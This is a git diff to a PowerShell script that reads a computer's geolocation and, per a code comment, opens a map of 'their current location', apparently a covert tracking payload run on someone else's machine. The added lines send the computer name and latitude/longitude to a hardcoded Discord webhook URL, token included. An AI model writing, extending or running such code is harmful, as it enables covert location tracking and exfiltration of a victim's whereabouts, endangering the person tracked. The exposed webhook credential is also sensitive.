@@ -129,6 +129,17 @@ $Lat = $GL[0].Substring(11) -replace ".$"
 
 $Lon = $GL[1].Substring(10) -replace ".$"
 
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
+# Send to Discord // Replace with your Discord webhook URL
+$webhookUrl = "https://discord.com/api/webhooks/1094395610901250128/WLuTUwGIZ_OgPU8iIuKNSamHu0JfY_YoqJllOj--yUcLhRofWQm6SGjpwzFFBUYnEop7"
+$body = @{
+    content = "Computer: $computerName`nCoordinates: Latitude = $Lat   Longitude = $Lon"
+} | ConvertTo-Json
+Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $body -ContentType "application/json"
+
+#-----------------------------------------------------------------------------------------------------------------------------------------------------------
+
 Pause-Script
 
 # Opens their browser with a map of their current location
